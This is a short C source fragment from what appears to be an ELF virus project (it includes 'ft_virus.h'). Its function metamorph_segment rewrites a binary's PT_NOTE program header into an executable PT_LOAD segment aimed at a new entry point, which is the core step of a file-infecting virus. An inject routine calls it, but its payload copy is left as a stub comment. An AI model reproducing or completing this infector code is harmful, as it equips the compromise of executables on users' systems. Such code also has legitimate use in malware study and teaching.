# include "ft_virus.h"

int FORCE_INLINE metamorph_segment(t_data data)
{
	Elf64_Phdr	p_hdr;
	Elf64_Ehdr	e_hdr;
	int		len;

	LSEEK(data.fd, 0, SEEK_SET);
	READ(data.fd, &e_hdr, sizeof(e_hdr));
	len = e_hdr.e_phnum;
	LSEEK(data.fd, e_hdr.e_phoff, SEEK_SET);
	do {
		READ(data.fd, &p_hdr, sizeof(p_hdr));
		if (p_hdr.p_type == PT_NOTE)
		{
			p_hdr.p_type = PT_LOAD;
			p_hdr.p_offset = data.bin.new_entry - data.bin.v_addr;
			p_hdr.p_vaddr = data.bin.new_entry;
			p_hdr.p_filesz = data.infos.pl_size;
			p_hdr.p_memsz = data.infos.pl_size;
			p_hdr.p_flags = PF_X | PF_R;
			LSEEK(data.fd, sizeof(p_hdr) * -1, SEEK_CUR);
			WRITE(data.fd, &p_hdr, sizeof(p_hdr));
			return (1) ;
		}
		len -= 1;
	} while (len) ;
	return (0);
}


int inject(t_data data)
{
	u64 offset;
	data.bin = get_infos(data.fd);
	metamorph_segment(data);
	offset = LSEEK(data.fd, 0, SEEK_END);
	/* align */
//	WRITE(1, "\x00\x00\x00\x00", data.bin.new_entry - data.bin.v_addr - offset);
	
	// memcpy
	return (1);
}
